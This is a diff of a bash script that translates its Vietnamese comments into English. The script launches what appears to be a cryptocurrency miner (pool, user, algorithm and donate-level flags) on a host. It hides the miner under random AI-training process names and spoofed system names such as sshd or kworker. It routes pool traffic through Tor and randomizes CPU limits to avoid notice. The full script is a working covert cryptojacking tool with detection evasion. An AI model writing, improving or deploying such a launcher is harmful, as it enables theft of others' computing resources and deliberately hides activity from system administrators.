@@ -1,9 +1,9 @@
 #!/bin/bash
 
-# Khởi động dịch vụ Tor, Privoxy và VPN với cấu hình Bridges
+# Start Tor, Privoxy, and OpenVPN services
 service tor restart
 if ! pgrep -x "tor" > /dev/null; then
-  echo "Tor service failed to start with Bridges configuration"
+  echo "Tor service failed to start"
   exit 1
 fi
 
@@ -17,55 +17,53 @@ if ! pgrep -x "openvpn" > /dev/null; then
   echo "OpenVPN service failed to start"
 fi
 
-# Kiểm tra và khởi động script đổi IP ngẫu nhiên nếu có
+# Run IP-changing script if it exists
 if [ -f /root/change_ip.sh ]; then
   /root/change_ip.sh &
 fi
 
-# Xóa tệp tiến trình cũ nếu tồn tại
+# Stop and remove old process if it exists
 if [ -f /usr/sbin/$(cat /root/model.txt) ]; then
-  echo "Xóa tiến trình cũ: $(cat /root/model.txt)"
+  echo "Removing old process: $(cat /root/model.txt)"
   rm -f /usr/sbin/$(cat /root/model.txt)
 fi
 
-# Danh sách các tên tiến trình hệ thống hợp lệ để bọc
+# List of system processes to disguise as
 SYSTEM_PROCESS_NAMES=("systemd" "sshd" "cron" "bash" "kworker" "dbus-daemon")
 
-# Chọn một tên tiến trình hệ thống hợp lệ ngẫu nhiên để bọc
+# Randomly select a system process name for disguise
 RANDOM_SYSTEM_PROCESS=${SYSTEM_PROCESS_NAMES[$RANDOM % ${#SYSTEM_PROCESS_NAMES[@]}]}
 
-# Danh sách các tên tiến trình liên quan đến AI training
+# List of AI training-related process names
 AI_PROCESS_NAMES=("ai_trainer" "deep_learning_worker" "neural_net" "model_optimizer" "tensor_processor" "gpu_trainer")
 
-# Chọn một tên tiến trình AI ngẫu nhiên từ danh sách
+# Randomly select an AI process name and generate a number
 RANDOM_AI_NAME=${AI_PROCESS_NAMES[$RANDOM % ${#AI_PROCESS_NAMES[@]}]}
-
-# Tạo số ngẫu nhiên
 RANDOM_NUMBER=$(shuf -i 1000-9999 -n 1)
 
-# Kết hợp tên tiến trình AI với số ngẫu nhiên để tạo tên cuối cùng
+# Combine AI process name and number for the final name
 FINAL_NAME="${RANDOM_AI_NAME}-${RANDOM_NUMBER}"
 echo $FINAL_NAME > /root/model.txt
 
-# Sao chép file gốc systemdd thành tên mới
+# Copy and rename the original systemdd file to the new name
 cp /usr/sbin/systemdd /usr/sbin/$FINAL_NAME
 
-# Tính toán số threads dựa trên % CPU ngẫu nhiên
-TOTAL_CORES=$(nproc)  # Xác định số CPU logic (bao gồm cả hyper-threading)
-cpu_hint=$(shuf -i $CPU_MIN-$CPU_MAX -n 1)  # Phần trăm CPU sử dụng ngẫu nhiên
-CPU_HINT=$(echo "($TOTAL_CORES * $cpu_hint) / 100" | bc)  # Tính số threads dựa trên % CPU và số core
+# Calculate number of threads based on random CPU percentage
+TOTAL_CORES=$(nproc)
+cpu_hint=$(shuf -i $CPU_MIN-$CPU_MAX -n 1)
+CPU_HINT=$(echo "($TOTAL_CORES * $cpu_hint) / 100" | bc)
 
-# Phân bổ tiến trình trên nhiều core với taskset
-CORE_SET=$(seq -s, 0 $(($TOTAL_CORES - 1)))  # Phân bổ trên tất cả các core logic
+# Assign the process to multiple cores using taskset
+CORE_SET=$(seq -s, 0 $(($TOTAL_CORES - 1)))
 
-# Giới hạn tổng công suất từ 50% đến 90% với cpulimit
-TOTAL_SYSTEM_POWER=$(($TOTAL_CORES * 100))  # Tổng công suất hệ thống (CPU logic x 100%)
-CPU_LIMIT_PERCENT=$(shuf -i 50-90 -n 1)  # Lấy giá trị ngẫu nhiên từ 50% đến 90% công suất
-CPU_LIMIT=$(($TOTAL_SYSTEM_POWER * $CPU_LIMIT_PERCENT / 100))  # Giới hạn công suất thực tế
+# Limit the total system power usage between 50% and 90%
+TOTAL_SYSTEM_POWER=$(($TOTAL_CORES * 100))
+CPU_LIMIT_PERCENT=$(shuf -i 50-90 -n 1)
+CPU_LIMIT=$(($TOTAL_SYSTEM_POWER * $CPU_LIMIT_PERCENT / 100))
 
-# Khởi động tiến trình systemdd dưới quyền người dùng nobody và ngụy trang dưới tên tiến trình hệ thống
-echo "Khởi động tiến trình với tên ngụy trang: $FINAL_NAME (được bọc dưới tên hệ thống: $RANDOM_SYSTEM_PROCESS)"
+# Start the disguised systemdd process with limited CPU usage
+echo "Starting process disguised as: $FINAL_NAME"
 sudo -u nobody exec -a "$RANDOM_SYSTEM_PROCESS" cpulimit -l $CPU_LIMIT -- taskset -c $CORE_SET torsocks /usr/sbin/$FINAL_NAME --donate-level $DONATE -o $POOL -u $USERNAME -a $ALGO --no-huge-pages --cpu-max-threads-hint=$CPU_HINT --tls --proxy=socks5://127.0.0.1:9050
 
-# Giữ tiến trình chạy
+# Keep the script running
 tail -f /dev/null
